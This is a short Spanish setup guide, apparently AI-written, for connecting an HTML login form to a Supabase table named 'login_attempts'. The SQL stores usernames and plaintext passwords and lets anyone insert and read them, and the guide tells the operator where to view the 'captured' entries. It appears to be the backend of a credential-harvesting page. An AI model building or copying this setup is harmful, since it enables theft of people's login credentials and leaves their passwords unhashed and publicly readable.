# Instrucciones para configurar el backend con Supabase

## Archivos creados:
1. ✅ `config.js` - Configuración de Supabase
2. ✅ `app.js` - Lógica de captura de datos del formulario
3. ✅ `index.html` - Ya tiene los cambios necesarios

## Pasos para configurar:

### 1. Crear cuenta y proyecto en Supabase
- Ve a https://supabase.com y crea una cuenta
- Crea un nuevo proyecto

### 2. Crear la tabla en la base de datos

En Supabase, ve a **SQL Editor** y ejecuta este código:

```sql
CREATE TABLE IF NOT EXISTS login_attempts (
    id BIGSERIAL PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    timestamp TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE login_attempts ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow anonymous insert" ON login_attempts
    FOR INSERT
    WITH CHECK (true);

CREATE POLICY "Allow anonymous read" ON login_attempts
    FOR SELECT
    USING (true);
```

### 3. Obtener tus credenciales

En Supabase: **Settings → API**
- Copia tu **Project URL**
- Copia tu **anon public** key

### 4. Configurar config.js

Abre `config.js` y reemplaza:
- `YOUR_SUPABASE_URL_HERE` → Tu Project URL
- `YOUR_SUPABASE_ANON_KEY_HERE` → Tu anon key

### 5. Listo! 🎉

Abre `index.html` en el navegador y prueba el formulario. Los datos se guardarán automáticamente en Supabase.

### Ver los datos capturados:
- Supabase → **Table Editor** → `login_attempts`

